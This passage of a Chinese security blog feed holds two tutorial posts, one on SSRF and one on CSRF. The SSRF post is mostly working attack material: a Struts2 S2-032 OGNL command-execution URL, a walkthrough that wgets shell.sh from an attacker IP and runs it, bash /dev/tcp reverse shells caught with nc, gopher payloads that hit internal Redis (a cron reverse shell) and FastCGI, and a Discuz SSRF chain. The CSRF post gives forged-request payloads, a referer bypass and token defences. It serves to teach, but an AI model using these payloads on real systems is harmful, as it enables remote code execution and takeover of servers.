class="line">？method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><p>判断是否存在Struts –s2-32漏洞，输入构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><p>返回用户名(说明存在Struts –s2-32漏洞)</p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>思路为通过wget下载脚本文件到指定目录(方便查找)，修改权限为可执行，最后执行脚本文件获取shell。</p><p>1.kali攻击机上的网站根目录(/var/www/html)下新建一个脚本文件shell.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.1.1.200&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801214832083.png" alt="image-20200801214832083"></p><p>2.启动kali的apache服务：service apache2 start</p><p>3.输入构造的payload(将POC最后面的cmd参数的值修改为我们想要执行的命令，记住空格要用%20替代)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;wget%20-P%20&#x2F;root%20http:&#x2F;&#x2F;10.1.1.200&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>4.接下来修改下载的文件的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;chmod%20755%20&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>5.利用nc接收反弹的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215257007.png" alt="image-20200801215257007"></p><p>6.输入执行脚本的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;.&#x2F;root&#x2F;shell.sh</span><br></pre></td></tr></table></figure><p>查看监听结果,成功获取shell</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801215643505.png" alt="image-20200801215643505"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1.限制协议为HTTP、HTTPS；</p><p>2.禁止30x跳转；</p><p>3.设置URL白名单或限制内网IP。</p><h2 id="利用-Gopher-协议拓展攻击面"><a href="#利用-Gopher-协议拓展攻击面" class="headerlink" title="利用 Gopher 协议拓展攻击面"></a>利用 Gopher 协议拓展攻击面</h2><p>此部分转载自长亭科技公众号[https:/]/blog.chaitin.cn/gopher-attack-surfaces/]</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p><h4 id="攻击面测试"><a href="#攻击面测试" class="headerlink" title="攻击面测试"></a>攻击面测试</h4><p>环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP: 172.19.23.218</span><br><span class="line">OS: CentOS 6</span><br></pre></td></tr></table></figure><p>根目录下1.php内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&quot;url&quot;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">$output &#x3D; curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h5><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。</p><p>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br></pre></td></tr></table></figure><p>利用这个脚本攻击自身并抓包得到数据流：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230139030.png" alt="image-20200801230139030"></p><p>改成适配于 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230323375.png" alt="image-20200801230323375"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230507722.png" alt="image-20200801230507722"></p><h5 id="攻击FastCGI"><a href="#攻击FastCGI" class="headerlink" title="攻击FastCGI"></a>攻击FastCGI</h5><p>一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br>首先构造 exp：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230630429.png" alt="image-20200801230630429"></p><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230804893.png" alt="image-20200801230804893"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801230831703.png" alt="image-20200801230831703"></p><h5 id="攻击内网-Vulnerability-Web"><a href="#攻击内网-Vulnerability-Web" class="headerlink" title="攻击内网 Vulnerability Web"></a>攻击内网 Vulnerability Web</h5><p>Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。<br>一个只能 127.0.0.1 访问的 exp.php，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[e]);?&gt;</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;exp.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%261</span><br></pre></td></tr></table></figure><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;exp.php HTTP&#x2F;1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl&#x2F;7.43.0%0d%0aAccept: *&#x2F;*%0d%0aContent-Length: 49%0d%0aContent-Type: application&#x2F;x-www-form-urlencoded%0d%0a%0d%0ae&#x3D;bash -i &gt;%2526 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%25261null</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231053626.png" alt="image-20200801231053626"></p><h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>【利用 Discuz SSRF 攻击 FastCGI】</p><p>Discuz X3.2 存在 SSRF 漏洞，当服务器开启了 Gopher wrapper 时，可以进行一系列的攻击。<br>首先根据 phpinfo 确定开启了 Gopher wrapper，且确定 Web 目录、PHP 运行方式为 FastCGI。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231234945.png" alt="image-20200801231234945"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231301811.png" alt="image-20200801231301811"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231326020.png" alt="image-20200801231326020"></p><p>测试 Gopher 协议是否可用，请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2fgopher.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure><p>其中 gopher.php 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:2333&#x2F;_test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>监听 2333 端口，访问上述 URL 即可验证：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231437085.png" alt="image-20200801231437085"></p><p>构造 FastCGI 的 Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2f1.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure><p>即可在 2333 端口上收到反弹的 shell：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231558705.png" alt="image-20200801231558705"></p><h4 id="系统局限性"><a href="#系统局限性" class="headerlink" title="系统局限性"></a>系统局限性</h4><p>1、大部分 PHP 并不会开启 fopen 的 gopher wrapper<br>2、file_get_contents 的 gopher 协议不能 URLencode<br>3、file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败<br>4、PHP 的 curl 默认不 follow 302 跳转<br>5、curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://yoursite.com/2020/08/01/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/CSRF漏洞/</id>
    <published>2020-08-01T10:39:35.000Z</published>
    <updated>2020-08-01T11:08:19.375Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.CSRF漏洞</span><br><span class="line">CSRF：跨站请求伪造漏洞，通常缩写为CSRF或XSRF</span><br><span class="line">XSS与CSRF区别：</span><br><span class="line">XSS利用站点内的信任客户，盗取Cookie</span><br><span class="line">CSRF通过伪造成受信任用户请求受信任的网站</span><br><span class="line"></span><br><span class="line">2.CSRF漏洞原理</span><br><span class="line">利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</span><br><span class="line">CSRF成功利用的条件：</span><br><span class="line">(1)用户已经登录系统</span><br><span class="line">(2)用户访问对应URL</span><br></pre></td></tr></table></figure><h2 id="无防护CSRF利用"><a href="#无防护CSRF利用" class="headerlink" title="无防护CSRF利用"></a>无防护CSRF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.GET型CSRF</span><br><span class="line">构造GET型URL，提交username和passwd参数，以此来新建对应的用户名和密码。</span><br><span class="line">例如：</span><br><span class="line">xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456</span><br><span class="line"></span><br><span class="line">隐蔽利用：img标签的src属性来包含修改的内容</span><br><span class="line">例子：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">2.POST型CSRF</span><br><span class="line">与GET型的区别在于提交数据的位置在form表单中。</span><br><span class="line">设置表单用于提交。如&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;111&quot;&#x2F;&gt;</span><br><span class="line">paylaod:</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;passwd&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sub&quot; value&#x3D;&quot;ok&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞探测"><a href="#CSRF漏洞探测" class="headerlink" title="CSRF漏洞探测"></a>CSRF漏洞探测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.手工探测</span><br><span class="line">手动探测原理在于探测web应用程序是否具有防止CSRF的措施：</span><br><span class="line">HTTP referer头</span><br><span class="line">是否设置token</span><br><span class="line">HTTP自定义头</span><br><span class="line"></span><br><span class="line">2.使用工具探测</span><br><span class="line">CSRFtester是一款CSRF漏洞的测试工具。</span><br><span class="line">测试原理：</span><br><span class="line">使用代理抓取我们在浏览器中访问过的所有连接以及所有的表单等信息，通过在CSRFtester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求。如果请求成功被网站服务器接受，则说明存在CSRF漏洞。</span><br><span class="line"></span><br><span class="line">使用：</span><br><span class="line">(1)设置浏览器代理</span><br><span class="line">(2)登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表单则存在CSRF漏洞</span><br><span class="line">(3)编写POC代码</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞-token防御请求"><a href="#CSRF漏洞-token防御请求" class="headerlink" title="CSRF漏洞 token防御请求"></a>CSRF漏洞 token防御请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞修复逻辑</span><br><span class="line">CSRF漏洞实质：服务器无法判断当前是否是合法用户的自定义操作。</span><br><span class="line"></span><br><span class="line">在用户登录之后给予用户一个唯一合法令牌，每一次操作过程，服务器都会验证令牌是否正确，如果正确执行操作，不正确不执行操作。</span><br><span class="line">一般情况下，给予的令牌会写入表单中隐藏域的value值中，随表单一起提交。</span><br><span class="line"></span><br><span class="line">2.生成token分析</span><br><span class="line">token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。</span><br><span class="line">每秒发生变化的token示例：</span><br><span class="line">&lt;?php</span><br><span class="line">function token_generate()&#123;</span><br><span class="line">$salt&#x3D;&quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">$token&#x3D;md5($salt);</span><br><span class="line">&#125;</span><br><span class="line">$token token_generate();</span><br><span class="line">echo $token;</span><br><span class="line"></span><br><span class="line">3.使用CSRF进行CSRF防御</span><br><span class="line">(1)登录验证成功之后，在会话session[&quot;user_token&quot;]中保存token</span><br><span class="line">(2)在后台操作中，增删改表单中添加隐藏域hidden，设置value为token</span><br><span class="line">(3)提交之后进行验证token是否正确</span><br></pre></td></tr></table></figure><h2 id="CSRF绕过referer"><a href="#CSRF绕过referer" class="headerlink" title="CSRF绕过referer"></a>CSRF绕过referer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.Referer防御CSRF原理</span><br><span class="line">HTTP referer是header的一部分，当浏览器向web服务器发送请求的时候，一般带上referer，告诉服务器从哪个页面链接过来的。</span><br><span class="line"></span><br><span class="line">Referer防御代码：</span><br><span class="line">在PHP中使用$_SERVER[&#39;HTTP_REFERER&#39;]获取页面提交请求中的referer值。</span><br><span class="line"></span><br><span class="line">2.绕过referer技巧</span><br><span class="line">如果服务端只判断当前的referer中是否具有域名，则可以直接新建名称为验证域名的文件夹进行绕过，把payload放到该文件夹中。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF利用"><a href="#GET型CSRF利用" class="headerlink" title="GET型CSRF利用"></a>GET型CSRF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.链接利用</span><br><span class="line">在html中，a标签代表链接，可以跳转到其他位置。</span><br><span class="line">需要发送对应的请求到链接指向的位置，然后返回响应。</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;请求的地址，会被HTTP请求到的未知地址，可以携带GET型参数&quot;&gt;内容&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">2.iframe利用</span><br><span class="line">iframe标签内容将在页面加载过程中自动进行加载，src&#39;指向的位置就是页面请求的位置。</span><br><span class="line">可以设置iframe的style为display:none，以此来不显示iframe加载的内容。</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;xxx&quot; style&#x3D;&quot;display:none&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.img标签利用</span><br><span class="line">img标签的内容会随着页面加载而被请求，以此是src指向的位置会在页面加载过程中进行请求。</span><br><span class="line">&lt;img src&#x3D;&quot;xxx&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.CSS-backgroud利用</span><br><span class="line">可以利用CSS中的background样式中的url来加载远程机器上的内容，从而对url中的内容发送http请求。</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 